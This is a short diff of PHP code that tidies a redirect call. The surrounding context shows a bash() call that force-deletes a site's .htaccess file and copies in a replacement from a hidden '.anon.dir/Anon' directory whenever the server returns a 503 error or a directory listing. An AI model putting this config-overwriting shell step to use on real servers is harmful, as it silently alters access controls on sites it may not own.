@@ -146,7 +146,7 @@
     if(strpos($rs,'503 Service Unavailable')||strpos($rs,'<title>Index of /</title>'))
     {$rs=bash("rm -f ./.htaccess && cp ./.anon.dir/Anon/base/access.cfg ./.htaccess");};
 
-    $rs=header("Location: https://$hn/?upkeep=init&rf=$fn&rk=$rk");
+    header("Location: https://$hn/?upkeep=init&rf=$fn&rk=$rk");
 
     die();
 # -----------------------------------------------------------------------------------------------------------------------------
